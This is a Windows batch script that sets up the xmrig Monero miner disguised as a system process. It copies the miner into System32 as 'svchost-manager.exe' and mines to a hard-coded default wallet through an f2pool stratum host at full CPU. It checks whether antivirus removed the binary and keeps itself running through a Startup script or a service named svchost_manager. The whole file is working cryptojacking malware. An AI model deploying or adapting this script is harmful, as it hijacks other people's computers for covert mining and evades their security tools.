@echo off

set VERSION=2.1

rem printing greetings

echo xmrig mining setup script v%VERSION%.
echo ^(please report issues to alterhu2020@gmail.com email^)
echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=%1
rem this one is optional
set EMAIL=%2

rem checking prerequisites

if [%WALLET%] == [] (
  set WALLET=84YikQQa894Grw3Kcsb3GbDaKsY2CciqUC4xeBCPQWqggncrQUNBtV4dZDwdQAcfrTZ32GijR8Ws7EuuAC5bhJG7FdTHFfy
  REM echo Script usage:
  REM echo ^> setup_svchost_manager.bat ^<wallet address^> [^<your email address^>]
  REM echo ERROR: Please specify your wallet address
  REM exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where wmic >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "wmic" utility to work correctly
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

rem calculating port

for /f "tokens=*" %%a in ('wmic cpu get SocketDesignation /Format:List ^| findstr /r /v "^$" ^| find /c /v ""') do set CPU_SOCKETS=%%a
if [%CPU_SOCKETS%] == [] ( 
  echo ERROR: Can't get CPU sockets from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get NumberOfCores /Format:List ^| findstr /r /v "^$"') do set CPU_CORES_PER_SOCKET=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_CORES_PER_SOCKET%") do set CPU_CORES_PER_SOCKET=%%b
if [%CPU_CORES_PER_SOCKET%] == [] ( 
  echo ERROR: Can't get CPU cores per socket from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get NumberOfLogicalProcessors /Format:List ^| findstr /r /v "^$"') do set CPU_THREADS=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_THREADS%") do set CPU_THREADS=%%b
if [%CPU_THREADS%] == [] ( 
  echo ERROR: Can't get CPU cores from wmic output
  exit 
)
set /a "CPU_THREADS = %CPU_SOCKETS% * %CPU_THREADS%"

for /f "tokens=*" %%a in ('wmic cpu get MaxClockSpeed /Format:List ^| findstr /r /v "^$"') do set CPU_MHZ=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_MHZ%") do set CPU_MHZ=%%b
if [%CPU_MHZ%] == [] ( 
  echo ERROR: Can't get CPU MHz from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get L2CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L2_CACHE=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_L2_CACHE%") do set CPU_L2_CACHE=%%b
if [%CPU_L2_CACHE%] == [] ( 
  echo ERROR: Can't get L2 CPU cache from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get L3CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L3_CACHE=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_L3_CACHE%") do set CPU_L3_CACHE=%%b
if [%CPU_L3_CACHE%] == [] ( 
  echo ERROR: Can't get L3 CPU cache from wmic output
  exit 
)

set /a "TOTAL_CACHE = %CPU_SOCKETS% * (%CPU_L2_CACHE% / %CPU_CORES_PER_SOCKET% + %CPU_L3_CACHE%)"
if [%TOTAL_CACHE%] == [] ( 
  echo ERROR: Can't compute total cache
  exit 
)

set /a "CACHE_THREADS = %TOTAL_CACHE% / 2048"

if %CPU_THREADS% lss %CACHE_THREADS% (
  set /a "EXP_MONERO_HASHRATE = %CPU_THREADS% * (%CPU_MHZ% * 20 / 1000)"
) else (
  set /a "EXP_MONERO_HASHRATE = %CACHE_THREADS% * (%CPU_MHZ% * 20 / 1000)"
)

if [%EXP_MONERO_HASHRATE%] == [] ( 
  echo ERROR: Can't compute projected Monero hashrate
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 12800 (
  echo ERROR: Wrong ^(too high^) projected Monero hashrate: %EXP_MONERO_HASHRATE%
  exit /b 1
)
if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%WINDIR%\System32\svchost_manager.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by %WINDIR%\System32\svchost_manager.bat script.
echo Mining will happen to %WALLET% wallet.

if not [%EMAIL%] == [] (
  echo ^(and %EMAIL% email as password to modify wallet options later at https:/code.pingbook.top/blog site^)
)

echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  echo Mining in background will be performed using svchost_manager service.
)

echo.
echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
echo.

pause

rem start doing stuff: preparing miner

echo [*] Removing previous xmrig miner (if any)
sc stop svchost_manager
sc delete svchost_manager
taskkill /f /t /im svchost_manager.exe

:REMOVE_DIR0
echo [*] Removing "%WINDIR%\System32\svchost-manager" file
timeout 5
REM rmdir /q /s "%WINDIR%\System32\xmrig" >NUL 2>NUL
del /S %WINDIR%\System32\svchost-manager.exe
IF EXIST "%WINDIR%\System32\svchost-manager.exe" GOTO REMOVE_DIR0

REM echo [*] Creating empty "%USERPROFILE%\xmrig" directory
REM mkdir "%USERPROFILE%\xmrig"

echo [*] Copying "%~dp0\svchost-manager.exe", "%~dp0\WinRing0x64.sys" and "%~dp0\config.json" to "%WINDIR%\System32"
copy /Y "%~dp0\svchost-manager.exe"   "%WINDIR%\System32"
copy /Y "%~dp0\WinRing0x64.sys"   "%WINDIR%\System32"
copy /Y "%~dp0\config.json" "%WINDIR%\System32"

echo [*] Checking if private version of "%WINDIR%\System32\svchost-manager.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%WINDIR%\System32\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config.json'" 
"%WINDIR%\System32\svchost-manager.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%WINDIR%\System32\svchost-manager.exe" (
  echo WARNING: Private version of "%WINDIR%\System32\svchost-manager.exe" is not functional
) else (
  echo WARNING: Private version of "%WINDIR%\System32\svchost-manager.exe" was removed by antivirus
)

exit /b 1

:MINER_OK

echo [*] Miner "%WINDIR%\System32\svchost-manager.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat '%WINDIR%\System32\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"stratum+tcp://xmr.f2pool.com:13531\",'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config.json'" 
powershell -Command "$out = cat '%WINDIR%\System32\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%.%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config.json'" 
powershell -Command "$out = cat '%WINDIR%\System32\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"x\",'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config.json'" 
powershell -Command "$out = cat '%WINDIR%\System32\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%WINDIR%\System32\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config.json'" 

copy /Y "%WINDIR%\System32\config.json" "%WINDIR%\System32\config_background.json" >NUL
powershell -Command "$out = cat '%WINDIR%\System32\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%WINDIR%\System32\config_background.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq svchost-manager.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0svchost-manager.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM svchost-manager.exe" if you want to remove background miner first.
echo :EXIT
) > "%WINDIR%\System32\svchost.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
echo [*] Adding call to "%WINDIR%\System32\svchost.bat" script to "%STARTUP_DIR%\svchost_manager.bat" script
(
echo @echo off
echo "%WINDIR%\System32\svchost.bat" --config="%WINDIR%\System32\config_background.json"
) > "%STARTUP_DIR%\svchost_manager.bat"

echo [*] Running miner in the background
call "%STARTUP_DIR%\svchost_manager.bat"
goto OK

:ADMIN_MINER_SETUP


echo [*] Copying "%~dp0\nssm.exe" to "%WINDIR%\System32"
copy /Y "%~dp0\nssm.exe" "%WINDIR%\System32"

echo [*] Creating svchost_manager service
sc stop svchost_manager
sc delete svchost_manager
"%WINDIR%\System32\nssm.exe" install svchost_manager "%WINDIR%\System32\svchost-manager.exe"
if errorlevel 1 (
  echo ERROR: Can't create svchost_manager service
  exit /b 1
)
echo [*] svchost_manager service installed successfull...
"%WINDIR%\System32\nssm.exe" set svchost_manager AppDirectory "%WINDIR%\System32"
"%WINDIR%\System32\nssm.exe" set svchost_manager AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%WINDIR%\System32\nssm.exe" set svchost_manager AppStdout "%WINDIR%\System32\stdout"
"%WINDIR%\System32\nssm.exe" set svchost_manager AppStderr "%WINDIR%\System32\stderr"

echo [*] Starting svchost_manager service
"%WINDIR%\System32\nssm.exe" start svchost_manager
if errorlevel 1 (
  echo ERROR: Can't start svchost_manager service
  exit /b 1
)

echo [*] Completed start the svchost_manager service
echo Please reboot system if svchost_manager service is not activated yet (if "%WINDIR%\System32\svchost.log" file is empty)
goto OK

:OK
echo
echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b
